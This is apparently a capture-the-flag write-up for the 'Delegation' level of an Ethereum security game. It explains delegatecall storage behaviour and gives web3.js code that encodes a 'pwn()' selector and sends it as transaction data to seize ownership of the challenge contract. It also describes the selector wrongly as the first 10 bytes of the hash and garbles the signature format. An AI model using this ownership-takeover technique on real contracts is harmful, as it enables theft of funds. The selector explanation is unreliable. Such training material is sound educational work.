Delegate calling means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since all sender, value and data are kept intact when performing the delegate call, to solve this challenge you will need to wrap and pass a malicious encoded payload. In this case, we see that the `pwn()` function will makes the player own the main contract.

The main takeaway in this level is that it's very easy introduce bugs to your contract if you use `delegation`, you need to be careful.

### Solution
1. First, we need to define the payload that we are going to wrap in the delegation call so it's interpreted by the delegation contract. It's important to understand that all function in Ethereum have a signature, which are the first 10 bytes of the keccak256 hashed string `function_name(type1 parameter_name1 visibility1, ...)":  
- Option 1:  
```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});
```

- Option 2:  
```
let payload = web3.utils.keccak256("pwn()").slice(0,10);
```

2. Send the tx with the malicious payload as data:  
```
await contract.sendTransaction({data: payload});
```

My tx in testnet: https://rinkeby.etherscan.io/tx/0x1f5c3c05d8147852a7f9761351a70ed7bbb4314af244d3e022e581b5eed6d72e
